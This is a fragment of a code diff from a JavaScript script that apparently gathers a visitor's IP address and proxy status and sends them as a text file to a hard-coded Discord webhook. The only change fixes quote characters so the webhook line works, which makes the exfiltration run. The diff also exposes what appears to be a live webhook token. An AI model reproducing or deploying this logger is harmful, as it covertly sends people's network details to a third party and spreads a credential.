@@ -56,7 +56,7 @@ return { ip, isProxy };
 }
 // Function to send info to Discord webhook as .txt file
 async function sendToWebhook(info) {
-const webhookUrl = ‘https://discord.com/api/webhooks/1432841888997834877/kGY6LdHzo7JliM6Kvw718EW9x2qlG6OojBb2CQc7Kov9G0Vqkn8De2mYqUgb1bRa7Ytv’;
+const webhookUrl = "https://discord.com/api/webhooks/1432841888997834877/kGY6LdHzo7JliM6Kvw718EW9x2qlG6OojBb2CQc7Kov9G0Vqkn8De2mYqUgb1bRa7Ytv";
 // Create .txt file with info
 const blob = new Blob([JSON.stringify(info)], { type: 'text/plain' });
 
